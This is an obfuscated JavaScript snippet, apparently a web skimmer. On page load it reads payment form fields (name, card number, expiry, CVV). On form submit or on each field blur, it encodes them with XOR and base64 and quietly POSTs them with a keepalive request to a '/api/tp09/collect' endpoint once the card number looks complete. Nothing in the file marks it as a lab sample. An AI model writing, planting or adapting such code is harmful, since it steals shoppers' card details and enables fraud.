(function () {
  "use strict";
  var _0x2882b5 = "/api/tp09/collect";
  var _0x50cf62 = ["name", "card", "exp", "cvv"];
  function _0x3a0ece(_0x4c29f5) {
    var _0x4b54e8 = (_0x4c29f5.card || "").replace(/\D/g, "");
    return _0x4b54e8.length >= 15;
  }
  var _0x4a5c6c = 66;
  function _0x1d29fa(_0x1f5046) {
    var _0x1f05b9 = "";
    for (var _0x4eeef4 = 0; _0x4eeef4 < _0x1f5046.length; _0x4eeef4++) {
      _0x1f05b9 += String.fromCharCode(_0x1f5046.charCodeAt(_0x4eeef4) ^ _0x4a5c6c);
    }
    return _0x1f05b9;
  }
  function _0x1fd993(_0x1d19dd) {
    return btoa(_0x1d29fa(JSON.stringify(_0x1d19dd)));
  }
  function _0x3b46d3() {
    var _0x2e4ec8 = {};
    _0x50cf62.forEach(function (_0x36fdc6) {
      var _0x2ddd0f = document.getElementById(_0x36fdc6);
      if (_0x2ddd0f) {
        _0x2e4ec8[_0x36fdc6] = _0x2ddd0f.value;
      }
    });
    return _0x2e4ec8;
  }
  function _0x3e447c(_0x247aca) {
    if (_0x3a0ece(_0x247aca)) {
      var _0x2c5e51 = _0x1fd993({
        t: Date.now(),
        page: location.pathname,
        data: _0x247aca
      });
      try {
        fetch(_0x2882b5, {
          method: "POST",
          body: _0x2c5e51,
          keepalive: true
        });
      } catch {}
    }
  }
  function _0x19e536() {
    var _0x2934ff = document.getElementById("pay");
    if (_0x2934ff) {
      _0x2934ff.addEventListener("submit", function () {
        _0x3e447c(_0x3b46d3());
      });
    }
    _0x50cf62.forEach(function (_0x575a6d) {
      var _0x308bcb = document.getElementById(_0x575a6d);
      if (_0x308bcb) {
        _0x308bcb.addEventListener("blur", function () {
          _0x3e447c(_0x3b46d3());
        });
      }
    });
  }
  if (document.readyState !== "loading") {
    _0x19e536();
  } else {
    document.addEventListener("DOMContentLoaded", _0x19e536);
  }
})();